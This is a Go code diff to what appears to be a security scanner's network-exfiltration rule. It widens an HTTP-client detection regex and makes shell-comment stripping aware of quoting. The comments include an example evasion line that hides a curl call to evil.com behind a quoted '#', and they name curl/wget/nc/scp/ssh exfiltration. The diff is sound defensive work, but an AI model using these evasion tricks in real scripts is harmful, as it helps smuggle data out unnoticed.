@@ -20,7 +20,11 @@ var (
 	// are not exfiltration channels.
 	httpURL = regexp.MustCompile(`(?i)https?://[a-z0-9.\-]+`)
 	// httpClient matches common language HTTP clients embedded in scripts.
-	httpClient = regexp.MustCompile(`(?i)(requests\.(get|post)|urllib\.request|http\.client|fetch\(|axios\.|net/http|httpx\.)`)
+	// requests.<method> covers ALL verbs (get/post/put/patch/delete/head/
+	// options) so an exfil via requests.put/.delete/.patch/.head/.options
+	// cannot slip past SK-NET-001; fetch\s*\( allows a space between `fetch`
+	// and its paren (`fetch ('…')`).
+	httpClient = regexp.MustCompile(`(?i)(requests\.(get|post|put|patch|delete|head|options)|urllib\.request|http\.client|fetch\s*\(|axios\.|net/http|httpx\.)`)
 	// localHost matches a genuine loopback URL. The host is anchored
 	// ([:/]|$) so `localhost.evil.com` is NOT mistaken for localhost (an
 	// unanchored prefix match would otherwise suppress SK-NET-001).
@@ -121,18 +125,32 @@ func networkReason(kind FileKind, hasCmd, hasURL bool) string {
 
 // stripShellComment removes a shell `#` comment from a line: everything from
 // the first `#` that starts a word (at line start or after whitespace) to the
-// end of line. A `#` embedded mid-token (`echo a#b`) is not a shell comment
-// and is preserved. Shebangs (`#!/bin/sh`) and inline notes (`cmd # note`)
-// both strip cleanly. This only ever removes prose, never a real network
-// call, so a command word appearing solely in a comment can no longer set
-// hasCmd and false-positive SK-NET-001.
+// end of line — but ONLY when that `#` is outside any quoted string. It tracks
+// single (`'`) and double (`"`) quote state while scanning, so a `#` inside a
+// quoted string (e.g. `echo "x # " && curl https://evil.com`) is NOT treated
+// as a comment start and the trailing real command is preserved — an attacker
+// can no longer hide a curl/wget/nc/scp/ssh exfil behind a quoted `#`. A `#`
+// embedded mid-token (`echo a#b`) is not a shell comment and is preserved.
+// Shebangs (`#!/bin/sh`) and inline notes (`cmd # note`) both strip cleanly.
+// This only ever removes prose, never a real network call, so a command word
+// appearing solely in a comment can no longer set hasCmd and false-positive
+// SK-NET-001.
 func stripShellComment(line string) string {
+	var inSingle, inDouble bool
 	for i := 0; i < len(line); i++ {
-		if line[i] != '#' {
-			continue
-		}
-		if i == 0 || line[i-1] == ' ' || line[i-1] == '\t' {
-			return line[:i]
+		switch line[i] {
+		case '\'':
+			if !inDouble {
+				inSingle = !inSingle
+			}
+		case '"':
+			if !inSingle {
+				inDouble = !inDouble
+			}
+		case '#':
+			if !inSingle && !inDouble && (i == 0 || line[i-1] == ' ' || line[i-1] == '\t') {
+				return line[:i]
+			}
 		}
 	}
 	return line
